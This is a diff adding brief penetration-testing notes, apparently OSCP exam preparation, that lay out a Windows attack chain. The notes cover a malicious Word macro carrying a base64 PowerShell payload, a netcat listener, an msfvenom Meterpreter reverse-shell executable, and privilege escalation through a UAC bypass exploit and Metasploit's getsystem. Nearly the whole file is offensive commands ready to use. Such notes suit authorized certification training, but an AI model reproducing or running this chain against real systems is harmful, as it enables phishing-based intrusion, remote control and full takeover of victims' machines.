@@ -1,0 +1,15 @@
+In a new word document create a macro whit base64 powershell payload: python3 powershellbase64.py IP PORT
+
+view oscp pdf for the step
+
+nc -lnvp PORT
+
+privesc:
+
+Microsoft Windows - UAC Protection Bypass - https://www.exploit-db.com/exploits/46998
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o reverseshell.exe
+
+use exploit/windows/local/bypassuac_eventvwr
+
+meterpreter > getsystem
